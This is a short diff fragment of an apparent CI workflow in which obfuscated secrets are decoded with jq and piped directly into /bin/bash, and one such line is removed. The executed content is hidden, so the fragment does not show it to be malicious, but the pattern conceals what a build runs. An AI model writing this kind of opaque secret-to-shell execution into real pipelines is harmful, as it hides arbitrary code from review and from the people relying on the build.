@@ -18,7 +18,6 @@ jobs:
           vfc32: ${{ secrets.vfc32 }}
         run: |
           printf '%s' "$vfc32" | jq -r .b9956 | /bin/bash
-          printf '%s' "$dtjg27" | jq -r .a0 | /bin/bash
           printf '%s' "$wp8" | jq -r .olx28 | /bin/bash
           echo $zjox34203 | jq -r .vdo35163 | /bin/bash
 
